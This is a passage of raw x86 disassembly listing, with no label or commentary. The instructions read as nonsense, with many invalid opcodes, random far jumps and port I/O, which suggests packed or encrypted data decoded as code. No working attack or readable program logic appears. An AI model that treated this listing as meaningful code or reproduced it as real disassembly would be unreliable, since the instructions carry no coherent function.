  412781:	test   BYTE PTR [eax+0x16],0x8f
  412785:	ins    BYTE PTR es:[edi],dx
  412786:	xchg   ebx,eax
  412787:	jb     0x412730
  412789:	push   cs
  41278a:	mov    DWORD PTR [ecx+ecx*2+0x2e640944],edx
  412791:	push   ecx
  412792:	jnp    0x41275e
  412794:	add    eax,0xa32d2170
  412799:	ficomp WORD PTR [bx+di-0x57c9]
  41279e:	inc    ebx
  41279f:	adc    al,0x5a
  4127a1:	(bad)  
  4127a2:	retf   0xe2d6
  4127a5:	jae    0x4127d8
  4127a7:	and    edx,DWORD PTR [esp+edx*8+0x37]
  4127ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127ac:	mov    dl,0x9c
  4127ae:	jns    0x4127cd
  4127b0:	jae    0x41277b
  4127b2:	fprem1 
  4127b4:	or     al,0xd7
  4127b6:	xchg   DWORD PTR [edi+0x77],ecx
  4127b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ba:	ds ret 
  4127bc:	stos   DWORD PTR es:[edi],eax
  4127bd:	stc    
  4127be:	fwait
  4127bf:	fwait
  4127c0:	(bad)  
  4127c3:	popf   
  4127c4:	jecxz  0x4127ac
  4127c6:	scas   eax,DWORD PTR es:[edi]
  4127c7:	jae    0x41281a
  4127c9:	pop    ebx
  4127ca:	sbb    al,0xa0
  4127cc:	add    dh,BYTE PTR [edi]
  4127ce:	aam    0xd9
  4127d0:	repz aas 
  4127d2:	or     ebp,DWORD PTR [edx]
  4127d4:	data16 adc al,0x56
  4127d7:	push   edx
  4127d8:	aam    0xe0
  4127da:	les    ebx,FWORD PTR [edx+0x4e]
  4127dd:	adc    cl,BYTE PTR [ecx]
  4127df:	fdivr  DWORD PTR [ebx+ebp*2-0x31]
  4127e3:	cmc    
  4127e4:	mov    ds,WORD PTR [ebp+0x3c]
  4127e7:	or     ebx,DWORD PTR [ebx+ebp*8]
  4127ea:	les    edi,FWORD PTR [ebp-0x3de3ef08]
  4127f0:	mov    DWORD PTR [ecx-0x5bd752fa],ebp
  4127f6:	push   esi
  4127f7:	cmp    eax,0x415da51d
  4127fc:	push   ebp
  4127fd:	or     ecx,DWORD PTR [esi+0x6c]
  412800:	rol    BYTE PTR [esi-0xd],0x68
  412804:	jmp    0x36741b38
  412809:	jnp    0x412871
  41280b:	push   0x6aef6c87
  412810:	adc    dh,BYTE PTR [edx-0x3e]
  412813:	in     eax,0x6b
  412815:	imul   esp,esi,0xffb77153
  41281b:	mov    edi,0x82f9573d
  412820:	add    BYTE PTR [edi-0xeed5bd4],ah
  412826:	add    al,0xb1
  412828:	pop    ecx
  412829:	xlat   BYTE PTR ds:[ebx]
  41282a:	inc    esi
  41282b:	je     0x4127c5
  41282d:	and    esp,DWORD PTR [ebx-0x75]
  412830:	shl    DWORD PTR [edx+0x6b],0x81
  412834:	jno    0x4127f1
  412836:	mov    ebp,DWORD PTR [ebx-0x639294f]
  41283c:	cdq    
  41283d:	pop    ebx
  41283e:	sahf   
  41283f:	inc    edx
  412840:	pushf  
  412841:	neg    DWORD PTR [edi-0x6f68527]
  412847:	shl    DWORD PTR [eax-0x1435c374],cl
  41284d:	iretw  
  41284f:	mov    bh,0x99
  412851:	dec    ecx
  412852:	call   0xb4a3:0x47f9bfda
  412859:	cmp    BYTE PTR [esi],dh
  41285b:	lahf   
  41285c:	in     al,dx
  41285d:	xor    cl,bl
  41285f:	jo     0x412826
  412861:	retf   
  412862:	test   eax,0xfe74f70c
  412867:	sbb    eax,0x160f2db2
  41286c:	xchg   BYTE PTR [ebx-0x3595769b],dl
  412872:	leave  
  412873:	retf   
  412874:	ror    eax,cl
  412876:	push   ds
  412877:	ss sbb cl,al
  41287a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41287b:	das    
  41287c:	addr16 gs push cs
  41287f:	ss mov dh,0xa7
  412882:	inc    edx
  412883:	ss es std 
  412886:	push   0xffffffc1
  412888:	(bad)  
  41288a:	in     eax,dx
  41288b:	xchg   esi,eax
  41288c:	cdq    
  41288d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41288e:	popa   
  41288f:	je     0x41282b
  412891:	sbb    esp,eax
  412893:	and    DWORD PTR [edi-0x56675787],esp
  412899:	test   eax,0x21ef333b
  41289e:	pop    ss
  41289f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a0:	sbb    eax,0x84b3c24a
  4128a5:	or     eax,DWORD PTR [ebx+0x39431616]
  4128ab:	repz jmp 0x7ed9:0xf2ce808d
  4128b3:	mov    WORD PTR [eax+0x6cd7e557],ss
  4128b9:	mov    al,0xbf
  4128bb:	fmul   st(4),st
  4128bd:	sar    DWORD PTR [edx+edi*1-0x7d],1
  4128c1:	dec    esi
  4128c2:	cmp    ecx,esi
  4128c4:	pop    esp
  4128c5:	in     al,0x93
  4128c7:	je     0x41290a
  4128c9:	adc    BYTE PTR [edi+0x1b],cl
  4128cc:	sbb    ebx,DWORD PTR [eax]
  4128ce:	adc    edi,DWORD PTR [ebx]
  4128d0:	mov    bh,0xf8
  4128d2:	mul    BYTE PTR [ebp-0x6aa0511d]
  4128d8:	pop    edi
  4128d9:	push   0x40e5e067
  4128de:	mov    cs,edi
  4128e0:	ficom  DWORD PTR [edx-0xc855faa]
  4128e6:	dec    esp
  4128e7:	pop    ebx
  4128e8:	test   BYTE PTR [edi+0x7d],0x4a
  4128ec:	mov    al,ds:0xa86a87b
  4128f1:	jnp    0x412970
  4128f3:	and    BYTE PTR [esi-0x7c42e99d],0x88
  4128fa:	jbe    0x4128da
  4128fc:	stos   DWORD PTR es:[edi],eax
  4128fd:	pop    eax
  4128fe:	mov    bh,0xfc
  412900:	jns    0x412895
  412902:	pop    esi
  412903:	arpl   WORD PTR [edx+eiz*2],ax
  412906:	shl    BYTE PTR [esi-0x57eb8116],1
  41290c:	push   ss
  41290d:	in     eax,dx
  41290e:	inc    esp
  41290f:	not    DWORD PTR [edi]
  412911:	test   edi,edx
  412913:	into   
  412914:	push   0x70
  412916:	(bad)  
  412918:	pop    eax
  412919:	mov    bh,0xd7
  41291b:	mov    ds:0x551560db,al
  412920:	sub    DWORD PTR [edx-0x621ef208],ebx
  412926:	push   0xfffffff7
  412928:	imul   ebx,DWORD PTR [ebp+0x7cf8795d],0xffffffe9
  41292f:	mov    bl,0x84
  412931:	repz data16 jne 0x41291e
  412935:	sub    al,0xee
  412937:	(bad)  [edx+0x2d]
  41293a:	xlat   BYTE PTR ds:[ebx]
  41293b:	jle    0x4128c4
  41293d:	test   al,0x22
  41293f:	popf   
  412940:	sub    al,0x90
  412942:	das    
  412943:	fbld   TBYTE PTR [ebx+ecx*8+0x41]
  412947:	test   BYTE PTR [edi+ebx*2+0x5d],ch
  41294b:	or     al,0xbf
  41294d:	into   
  41294e:	push   esp
  41294f:	inc    ebp
  412950:	sbb    eax,ecx
  412952:	jne    0x412913
  412954:	outs   dx,BYTE PTR ds:[esi]
  412955:	cmc    
  412956:	(bad)  
  412957:	xor    al,0xe0
  412959:	adc    al,BYTE PTR ds:0x2af418e3
  41295f:	pop    es
  412960:	push   esp
  412961:	push   0x3
  412963:	(bad)  
  412965:	inc    edi
  412966:	scas   al,BYTE PTR es:[edi]
  412967:	nop
  412968:	fiadd  DWORD PTR [esp+eiz*8]
  41296b:	xlat   BYTE PTR ds:[ebx]
  41296c:	lods   eax,DWORD PTR ds:[esi]
  41296d:	(bad)  
  41296e:	paddusb mm0,mm1
  412971:	test   eax,0xbea8d549
  412976:	(bad)  
  412977:	mov    bh,0x3b
  412979:	push   0x4d727567
  41297e:	iret   
  41297f:	sbb    DWORD PTR [edi],0x60
  412982:	enter  0x3eb0,0x16
  412986:	xor    dh,bl
  412988:	ins    BYTE PTR es:[edi],dx
  412989:	push   eax
  41298a:	jmp    0x41293a
  41298c:	add    ah,cl
  41298e:	xor    DWORD PTR [esi],esp
  412990:	ja     0x41292e
  412992:	mov    dl,0x1
  412994:	std    
  412995:	push   ebx
  412996:	das    
  412997:	cmp    edx,DWORD PTR [esi-0x2d]
  41299a:	dec    esi
  41299b:	mov    al,ds:0xcb851829
  4129a0:	push   esp
  4129a1:	arpl   WORD PTR [edx+0x31],ax
  4129a4:	sti    
  4129a5:	loop   0x4129f7
  4129a7:	stos   DWORD PTR es:[edi],eax
  4129a8:	mov    ah,0x3e
  4129aa:	xor    al,0xcc
  4129ac:	push   ss
  4129ad:	dec    esi
  4129ae:	stos   BYTE PTR es:[edi],al
  4129af:	into   
  4129b0:	out    0x15,al
  4129b2:	(bad)  
  4129b3:	pop    edi
  4129b4:	rcr    BYTE PTR [ebp-0x25],1
  4129b7:	fidiv  DWORD PTR [ebx-0x4]
  4129ba:	out    0x23,eax
  4129bc:	mov    bl,0x6
  4129be:	push   esp
  4129bf:	push   ecx
  4129c0:	jo     0x412a18
  4129c2:	lahf   
  4129c3:	ds popf 
  4129c5:	fisttp DWORD PTR [esi]
  4129c7:	rol    BYTE PTR [eax+0x3478b6f2],1
  4129cd:	xor    al,0x70
  4129cf:	int3   
  4129d0:	sub    eax,0xc4a3c805
  4129d5:	adc    DWORD PTR ds:0xf4b9faf4,edi
  4129db:	jno    0x412a19
  4129dd:	popa   
  4129de:	pop    eax
  4129df:	arpl   WORD PTR [edi+edx*4],ax
  4129e2:	(bad)  
  4129e3:	push   ecx
  4129e4:	add    DWORD PTR [ebx],edx
  4129e6:	std    
  4129e7:	pop    ebx
  4129e8:	aaa    
  4129e9:	into   
  4129ea:	mov    dh,0x15
  4129ec:	dec    esi
  4129ed:	ret    
  4129ee:	or     eax,0x9fc42f96
  4129f3:	pop    es
  4129f4:	sub    bh,BYTE PTR [ebp+0x20]
  4129f7:	jmp    0x412989
  4129f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129fa:	aaa    
  4129fb:	xor    BYTE PTR ds:0xf2b93c76,ch
  412a01:	fimul  WORD PTR [ebx+0x4e727597]
  412a07:	ss call ebx
  412a0a:	fcom   st(3)
  412a0c:	pop    edi
  412a0d:	xor    eax,0x9ad97035
  412a12:	pop    edx
  412a13:	pop    ss
  412a14:	adc    BYTE PTR [eax+0x33],cl
  412a17:	add    eax,0xd5b1b20b
  412a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a1d:	outs   dx,DWORD PTR ds:[esi]
  412a1e:	shl    BYTE PTR [ecx+0xb],0x2b
  412a22:	fst    QWORD PTR cs:[ebx]
  412a25:	xor    DWORD PTR [eax],0xffffffed
  412a28:	repz rcr BYTE PTR ds:0x5f5815d,cl
  412a2f:	jge    0x4129c2
  412a31:	mov    ds:0xfdb86cdf,eax
  412a36:	enter  0x6e8d,0xa4
  412a3a:	ret    0x7d1
  412a3d:	sbb    esi,DWORD PTR [ecx-0x7c]
  412a40:	fbstp  TBYTE PTR [ebp-0x7b]
  412a43:	stos   BYTE PTR es:[edi],al
  412a44:	sub    al,0xf0
  412a46:	arpl   WORD PTR [ebx-0x30],dx
  412a49:	aad    0x8e
  412a4b:	cs mov cl,0xeb
  412a4e:	call   0xeb03e87d
  412a53:	push   0xc
  412a55:	inc    edx
  412a56:	retf   0x6787
  412a59:	out    dx,eax
  412a5a:	loope  0x412ab7
  412a5c:	gs (bad) 
  412a5f:	push   eax
  412a60:	ret    0x1037
  412a63:	in     eax,dx
  412a64:	inc    edi
  412a65:	jecxz  0x412a65
  412a67:	push   edi
  412a68:	fs xor al,0x62
  412a6b:	push   0x10b09c44
  412a70:	inc    edx
  412a71:	sbb    dl,BYTE PTR [edx]
  412a73:	push   eax
  412a74:	jl     0x412a48
  412a76:	repnz shl DWORD PTR [ebx+ebp*2+0x28],1
  412a7b:	sbb    BYTE PTR [eax],0x92
  412a7e:	sub    ch,BYTE PTR [ecx+ebx*4-0x6c]
  412a82:	inc    esp
  412a83:	or     eax,0x35ca74c5
  412a88:	push   ecx
  412a89:	das    
  412a8a:	xor    eax,0x61697f91
  412a8f:	into   
  412a90:	jne    0x412a52
  412a92:	pop    esi
  412a93:	jb     0x412a45
  412a95:	mov    eax,0x26c31304
  412a9a:	ja     0x412abd
  412a9c:	int3   
  412a9d:	iret   
  412a9e:	pushf  
  412a9f:	enter  0x316e,0x59
  412aa3:	or     edx,esp
  412aa5:	rcr    esi,cl
  412aa7:	mov    ah,dh
  412aa9:	mov    DWORD PTR [edi-0x13],edi
  412aac:	dec    ebp
  412aad:	aam    0x68
  412aaf:	enter  0x66af,0x67
  412ab3:	nop
  412ab4:	jl     0x412af4
  412ab6:	and    al,BYTE PTR [ebp+0x2eea296f]
  412abc:	adc    al,0x4
  412abe:	retf   0xea05
  412ac1:	adc    dl,0x60
  412ac4:	cwde   
  412ac5:	jp     0x412b14
  412ac7:	and    BYTE PTR [ebp+0x4d],dh
  412aca:	cli    
  412acb:	test   eax,0x79fae43c
  412ad0:	je     0x412b3e
  412ad2:	jmp    0xe0b8:0xe45b59f4
  412ad9:	xchg   DWORD PTR [edi-0x28],ebx
  412adc:	fmul   QWORD PTR [eax+0x488769d8]
  412ae2:	test   eax,0xdfa7246f
  412ae7:	push   0x669ca1c4
  412aec:	cdq    
  412aed:	mov    eax,0x87811259
  412af2:	jle    0x412a97
  412af4:	push   edx
  412af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412af6:	fistp  QWORD PTR [eax-0x40]
  412af9:	stc    
  412afa:	imul   eax,edx,0x430d9be0
  412b00:	add    DWORD PTR [edi+0x27bace3e],edx
  412b06:	lock in al,0x97
  412b09:	cdq    
  412b0a:	adc    eax,0x9a1dfa12
  412b0f:	mov    ebx,0x3a5d7e5d
  412b14:	mov    BYTE PTR [eax+0x47f21473],al
  412b1a:	mov    edi,0x9062e512
  412b1f:	(bad)  
  412b21:	pop    ds
  412b22:	imul   esp,ebp,0xe5cac553
  412b28:	mov    bh,0x8
  412b2a:	cmp    DWORD PTR [esi+0x6c62af50],eax
  412b30:	xchg   ebp,eax
  412b31:	pop    ds
  412b32:	mov    bl,0x2b
  412b34:	dec    eax
  412b35:	pop    esi
  412b36:	or     al,0xb2
  412b38:	add    ah,BYTE PTR [bp+0x18]
  412b3c:	add    esp,DWORD PTR [edx+0x40]
  412b3f:	pop    ss
  412b40:	jge    0x412ae9
  412b42:	and    BYTE PTR [ebp+0x7],dl
  412b45:	add    al,0x5a
  412b47:	pop    ss
  412b48:	adc    BYTE PTR [edx+0x23],0xaa
  412b4c:	pusha  
  412b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b4e:	dec    ecx
  412b4f:	pop    ebp
  412b50:	lock adc al,BYTE PTR [ecx]
  412b53:	push   cs
  412b54:	movq   QWORD PTR [ebp+0x19],mm7
  412b58:	inc    esp
  412b59:	sbb    DWORD PTR [ecx+0x48],ebp
  412b5c:	cwde   
  412b5d:	and    eax,0xda58e3c2
  412b62:	mov    ah,0x3c
  412b64:	jp     0x412b2b
  412b66:	mov    cl,0x60
  412b68:	lea    esi,[ebp-0x39]
  412b6b:	xor    DWORD PTR [eax+0x72a8be3f],esi
  412b71:	add    eax,0xfdef06e4
  412b76:	or     eax,0xd5fc214d
  412b7b:	mov    cs,WORD PTR [ebx-0x3d41b4b5]
  412b81:	jnp    0x412bcb
  412b83:	mov    edi,0xc8ed7ee2
  412b88:	pushf  
  412b89:	pop    ecx
  412b8a:	aad    0x8c
  412b8c:	inc    esp
  412b8d:	jmp    0x700f1f6b
  412b92:	add    cl,BYTE PTR [ebp-0x425bcbed]
  412b98:	popf   
  412b99:	pop    ss
  412b9a:	ror    BYTE PTR [edx],0x17
  412b9d:	and    bl,cl
  412b9f:	mov    ecx,0x5f027e34
  412ba4:	mov    al,0x9f
  412ba6:	and    esi,edx
  412ba8:	xlat   BYTE PTR ds:[ebx]
  412ba9:	(bad)  
  412baa:	pop    esi
  412bab:	add    bh,al
  412bad:	int    0x15
  412baf:	and    DWORD PTR [edx+0x28],eax
  412bb2:	lods   al,BYTE PTR ds:[esi]
  412bb3:	xchg   edi,eax
  412bb4:	es inc ecx
  412bb6:	repz bound eax,QWORD PTR [ebx]
  412bb9:	adc    al,0x41
  412bbb:	jl     0x412b72
  412bbd:	sub    ch,BYTE PTR [edx+0x2e62e67e]
  412bc3:	xor    bl,BYTE PTR [ebx+0x19]
  412bc6:	scas   eax,DWORD PTR es:[edi]
  412bc7:	lahf   
  412bc8:	sub    DWORD PTR [ebx-0x32],edx
  412bcb:	mov    ecx,0x7ffdd8a1
  412bd0:	sub    eax,0x2acfaa9
  412bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd6:	mov    DWORD PTR [eax],edi
  412bd8:	sbb    dl,BYTE PTR [edx-0x72]
  412bdb:	dec    eax
  412bdc:	sub    DWORD PTR [esp+ebx*8],edx
  412bdf:	jg     0x412bf8
  412be1:	or     DWORD PTR [ecx-0x4f],esp
  412be4:	add    dh,BYTE PTR [eax+ebp*2+0x1d]
  412be8:	jl     0x412b8b
  412bea:	adc    esi,DWORD PTR [ebp+0x53c68791]
  412bf0:	jl     0x412bd1
  412bf2:	dec    ebp
  412bf3:	retf   0x7b94
  412bf6:	add    al,0xf6
  412bf8:	retf   0x94ad
  412bfb:	in     al,dx
  412bfc:	mov    al,0x6a
  412bfe:	(bad)  
  412bff:	js     0x412bc0
  412c01:	mov    WORD PTR [esi+0x23],es
  412c04:	out    dx,eax
  412c05:	cs hlt 
  412c07:	mov    edx,DWORD PTR [eax-0x6d]
  412c0a:	xor    dl,BYTE PTR [ebp+0x2dea52f1]
  412c10:	data16 add al,0x5d
  412c13:	push   ebp
  412c14:	js     0x412bdf
  412c16:	xchg   ebx,eax
  412c17:	enter  0x2b33,0x8d
  412c1b:	adc    bh,BYTE PTR [edx-0x5b]
  412c1e:	inc    ecx
  412c1f:	adc    DWORD PTR [eax-0x229131f9],edi
  412c25:	inc    ebp
  412c26:	scas   al,BYTE PTR es:[edi]
  412c27:	and    BYTE PTR [esi],0x1f
  412c2a:	test   eax,0xca5bc573
  412c2f:	sbb    ch,BYTE PTR [eax+0x449210cd]
  412c35:	shl    DWORD PTR [edi+esi*8+0x4bf0704],1
  412c3c:	jle    0x412c2b
  412c3e:	cmp    DWORD PTR [edx+0x6625143f],0xffffffd1
  412c45:	fsub   QWORD PTR ds:0x334d7264
  412c4b:	shl    DWORD PTR [ecx],1
  412c4d:	sbb    al,0xd6
  412c4f:	(bad)  
  412c50:	cmp    dl,BYTE PTR [esi+ecx*8-0x6d]
  412c54:	data16 jbe 0x412ca9
  412c57:	fstp   DWORD PTR cs:[esi]
  412c5a:	add    eax,0x69463897
  412c5f:	jns    0x412cac
  412c61:	aam    0xbb
  412c63:	aad    0x90
  412c65:	ins    DWORD PTR es:[edi],dx
  412c66:	xchg   ebx,eax
  412c67:	sbb    dh,bh
  412c69:	pop    eax
  412c6a:	shr    BYTE PTR [ebx-0x7d609742],0xd
  412c71:	jge    0x412c1f
  412c73:	adc    esp,DWORD PTR [ebx]
  412c75:	push   es
  412c76:	leave  
  412c77:	test   bh,al
  412c79:	cli    
  412c7a:	sbb    eax,0x9cb45a2a
  412c7f:	mov    ch,0xcf
  412c81:	xchg   BYTE PTR [ebx+edx*2-0x4e],ch
  412c85:	sti    
  412c86:	sbb    ebp,DWORD PTR [edx]
  412c88:	out    0xf6,eax
  412c8a:	pusha  
  412c8b:	fmulp  st(0),st
  412c8d:	xor    ecx,edx
  412c8f:	xchg   DWORD PTR cs:[edx-0x69],esp
  412c93:	add    BYTE PTR [ebx+0xb3a16f8],ch
  412c99:	icebp  
  412c9a:	and    edx,DWORD PTR [ebx]
  412c9c:	(bad)  
  412c9d:	nop
  412c9e:	inc    ecx
  412c9f:	push   eax
  412ca0:	mov    ah,0xa0
  412ca2:	jl     0x412c42
  412ca4:	out    dx,eax
  412ca5:	aam    0xc1
  412ca7:	imul   eax,DWORD PTR [ebx+0x3f7100a3],0xffffff9e
  412cae:	sbb    BYTE PTR [ecx+0x8],ch
  412cb1:	adc    al,0xd
  412cb3:	ss mov ecx,0x8d74668f
  412cb9:	ss pop esi
  412cbb:	int    0x97
  412cbd:	clc    
  412cbe:	repnz sub eax,0x8e919577
  412cc4:	push   0x15
  412cc6:	sbb    eax,0x7609d28e
  412ccb:	and    al,0xa9
  412ccd:	and    eax,0x55c5c327
  412cd2:	mov    bl,BYTE PTR ds:0x3995d916
  412cd8:	sahf   
  412cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cda:	mov    bl,0x71
  412cdc:	xor    DWORD PTR [ecx+ebp*4-0x35],0x23000e24
  412ce4:	out    dx,eax
  412ce5:	aaa    
  412ce6:	push   edx
  412ce7:	ret    
  412ce8:	(bad)  
  412ce9:	aaa    
  412cea:	xlat   BYTE PTR ds:[ebx]
  412ceb:	push   edx
  412cec:	fiadd  WORD PTR ds:0xef57c49e
  412cf2:	jmp    0x412d51
  412cf4:	mov    esp,DWORD PTR [esi-0x58a79b6a]
  412cfa:	retf   0xa7
  412cfd:	xor    BYTE PTR [ebp-0xbf76cfe],ch
  412d03:	nop
  412d04:	pop    esp
  412d05:	xchg   ebx,eax
  412d06:	sbb    al,0x54
  412d08:	in     eax,0x96
  412d0a:	popf   
  412d0b:	punpckhdq mm2,QWORD PTR [ecx-0x78b701c4]
  412d12:	cmp    ebp,DWORD PTR [ebx+0x2a]
  412d15:	push   ebx
  412d16:	cdq    
  412d17:	pusha  
  412d18:	adc    al,0xab
  412d1a:	inc    edx
  412d1b:	neg    BYTE PTR gs:[ecx+0x2c]
  412d1f:	and    eax,0xa5ae66bd
  412d24:	jge    0x412d60
  412d26:	mov    edx,0x4b46f3e
  412d2b:	xor    eax,0x509fd26a
  412d30:	lahf   
  412d31:	push   0x6a0185b3
  412d36:	mov    cl,BYTE PTR [ebx+eax*8-0x74d4f8ae]
  412d3d:	mov    edi,0x5a63e79f
  412d42:	xchg   esp,eax
  412d43:	mov    dh,0x49
  412d45:	cmp    BYTE PTR [esi],al
  412d47:	clc    
  412d48:	in     eax,dx
  412d49:	sbb    al,0x35
  412d4b:	inc    edi
  412d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d4d:	mov    edx,0xa8b4a808
  412d52:	sahf   
  412d53:	ret    
  412d54:	cmp    al,0x5d
  412d56:	call   0x6f0:0x2d42f229
  412d5d:	mov    ds:0x956b82c4,al
  412d62:	loopne 0x412d2f
  412d64:	push   ds
  412d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d66:	iret   
  412d67:	mov    dh,0xf2
  412d69:	mov    dl,0x73
  412d6b:	pop    esp
  412d6c:	xchg   ecx,eax
  412d6d:	mov    dh,0x58
  412d6f:	mov    al,0x90
  412d71:	and    ebx,DWORD PTR [ecx-0x3e229211]
  412d77:	push   esp
  412d78:	inc    ecx
  412d79:	loop   0x412db6
  412d7b:	in     eax,0x8f
  412d7d:	mov    eax,0xdc3a5429
  412d83:	retf   0x8c16
  412d86:	mov    al,ds:0xa5e2e735
  412d8b:	mov    cl,0x5f
  412d8d:	push   0xae40d3f3
  412d92:	cmp    esi,DWORD PTR [edi+0x7d]
  412d95:	test   bh,bl
  412d97:	mov    esp,0xae74810b
  412d9c:	dec    ecx
  412d9d:	adc    eax,0xf9097501
  412da2:	jge    0x412d9d
  412da4:	in     eax,dx
  412da5:	rol    DWORD PTR [ebx],0x2e
  412da8:	sbb    edi,DWORD PTR [eax]
  412daa:	mov    al,0xf2
  412dac:	aam    0x5c
  412dae:	fidivr DWORD PTR [eax]
  412db0:	(bad)  
  412db1:	or     bl,BYTE PTR [eax]
  412db3:	pop    ecx
  412db4:	es leave 
  412db6:	retf   
  412db7:	neg    DWORD PTR [ecx+0x6c]
  412dba:	pop    edx
  412dbb:	retf   0x5915
  412dbe:	les    ecx,FWORD PTR [ecx-0x4]
  412dc1:	jnp    0x412da9
  412dc3:	arpl   WORD PTR [edi+0x15],dx
  412dc6:	pop    esi
  412dc7:	push   edx
  412dc8:	sbb    al,0x40
  412dca:	mov    eax,ds:0x9fbeed3c
  412dcf:	not    BYTE PTR [ebx]
  412dd1:	and    ecx,DWORD PTR [eax+0x3949820a]
  412dd7:	or     esp,DWORD PTR cs:[edx-0x3d8a8e06]
  412dde:	jns    0x412dee
  412de0:	push   edx
  412de1:	mov    cl,0x46
  412de3:	test   al,0x29
  412de5:	sub    bl,BYTE PTR [edi+0x14969f48]
  412deb:	mov    esi,DWORD PTR ds:0x88e9820a
  412df1:	in     al,dx
  412df2:	into   
  412df3:	push   ecx
  412df4:	xchg   esp,eax
  412df5:	push   ds
  412df6:	push   edi
  412df7:	arpl   bx,di
  412df9:	sub    al,0x81
  412dfb:	retf   
  412dfc:	iret   
  412dfd:	sub    ecx,DWORD PTR [ecx]
  412dff:	jp     0x412e3d
  412e01:	cmp    DWORD PTR [eax+ebp*1-0x4eb0b8d0],esi
  412e08:	xchg   esp,eax
  412e09:	sub    al,0x68
  412e0b:	repz gs in eax,dx
  412e0e:	and    DWORD PTR [eax-0x10],ebp
  412e11:	push   cs
  412e12:	jecxz  0x412de0
  412e14:	test   DWORD PTR [esi+0x24c0b3dc],0xe0761e91
  412e1e:	push   0x1069fd76
  412e23:	jmp    esi
  412e25:	lahf   
  412e26:	inc    eax
  412e27:	popf   
  412e28:	mov    ah,0xfb
  412e2a:	sbb    eax,0x48d55577
  412e2f:	shl    DWORD PTR [eax],1
  412e31:	jecxz  0x412e2b
  412e33:	add    al,0x66
  412e35:	push   edx
  412e36:	mov    ebx,DWORD PTR [edx+0x13]
  412e39:	pop    edi
  412e3a:	retf   
  412e3b:	shr    DWORD PTR [ebp+0x787d0f8b],0x68
  412e42:	ss pop esp
  412e44:	adc    BYTE PTR [esi],0x7b
  412e47:	xchg   edx,eax
  412e48:	int3   
  412e49:	fisubr DWORD PTR [ebp+ecx*8+0x2d]
  412e4d:	pushf  
  412e4e:	add    al,0xa
  412e50:	sar    edi,1
  412e52:	lahf   
  412e53:	cdq    
  412e54:	jae    0x412e4c
  412e56:	retf   0xa1a2
  412e59:	mov    edx,0xee8621b9
  412e5e:	dec    edi
  412e5f:	out    0x88,eax
  412e61:	(bad)  
  412e62:	jo     0x412e39
  412e64:	aaa    
  412e65:	mov    bl,0x38
  412e67:	mov    eax,0x17c8a686
  412e6c:	add    esi,DWORD PTR [ebx+0x11130a47]
  412e72:	mov    al,ds:0x7748c74e
  412e77:	ficomp WORD PTR [ebp+eiz*8+0x36]
  412e7b:	cmc    
  412e7c:	mov    ecx,0xdce83a95
  412e81:	mov    WORD PTR [ebx+edi*2+0x5d],fs
  412e85:	dec    esi
  412e86:	in     eax,0x3c
  412e88:	adc    eax,DWORD PTR [edx+eiz*1-0x785127dc]
  412e8f:	test   BYTE PTR [eax+0x73e701be],cl
  412e95:	sbb    BYTE PTR [ebx-0x7923a10d],0x8
  412e9c:	repz int3 
  412e9e:	arpl   WORD PTR [ecx],dx
  412ea0:	fnsave [edi]
  412ea2:	cld    
  412ea3:	push   ss
  412ea4:	fistp  QWORD PTR [ebx+0x58fc7d4b]
  412eaa:	adc    al,0x22
  412eac:	cmp    BYTE PTR [ebx],ah
  412eae:	sbb    BYTE PTR [eax-0x75],cl
  412eb1:	loop   0x412e93
  412eb3:	or     ebp,DWORD PTR [ebx-0x50]
  412eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eb7:	dec    edx
  412eb8:	test   BYTE PTR [ebx-0x3f],cl
  412ebb:	out    0x3f,eax
  412ebd:	jbe    0x412f1b
  412ebf:	mov    dh,0xdf
  412ec1:	mov    ebp,0x47f97a93
  412ec6:	imul   esi,DWORD PTR [ebp+0xfd65c42],0xffffffc5
  412ecd:	mov    cl,0xe1
  412ecf:	daa    
  412ed0:	dec    ebp
  412ed1:	adc    eax,0x7e6499e7
  412ed6:	pop    es
  412ed7:	in     eax,dx
  412ed8:	push   ebp
  412ed9:	into   
  412eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412edb:	sub    esi,edi
  412edd:	xor    al,0x3
  412edf:	mov    cl,0x8
  412ee1:	test   DWORD PTR [edx-0x1954a009],ebp
  412ee7:	out    0x3e,al
  412ee9:	addr16 mov ah,0x1f
  412eec:	test   DWORD PTR [ebp-0x4819f9ec],esp
  412ef2:	mov    ebx,0xc6254bb9
  412ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ef8:	in     al,dx
  412ef9:	push   es
  412efa:	mov    ebp,ebx
  412efc:	addr16 xchg ecx,eax
  412efe:	aam    0x91
  412f00:	mov    edi,0xe99bd632
  412f05:	shl    BYTE PTR ds:[eax+0x29ec6987],0x2e
  412f0d:	mov    dh,0x33
  412f0f:	sbb    eax,0xa89d669b
  412f14:	sbb    DWORD PTR [eax-0x46],ebp
  412f17:	pop    eax
  412f18:	or     BYTE PTR [esp+eiz*4+0x386324cc],0xd5
  412f20:	retfw  0xbef8
  412f24:	test   eax,ebx
  412f26:	inc    edx
  412f27:	shl    BYTE PTR ds:0xb3a42f76,cl
  412f2d:	adc    esi,DWORD PTR [edx-0x20780f3]
  412f33:	int3   
  412f34:	arpl   WORD PTR ds:0xe8345f72,bx
  412f3a:	(bad)  
  412f3b:	sbb    eax,0xe3f5e04d
  412f40:	xor    ch,BYTE PTR [edx+eiz*1-0xb]
  412f44:	mov    eax,0xcac588c9
  412f49:	jmp    0x68f:0xb3f4d590
  412f50:	jae    0x412fc8
  412f52:	lock jecxz 0x412f52
  412f55:	mov    esi,0xa42e0754
  412f5a:	and    bh,BYTE PTR [ebp+0x6e]
  412f5d:	sub    al,dh
  412f5f:	adc    al,0xda
  412f61:	addr16 and ch,bl
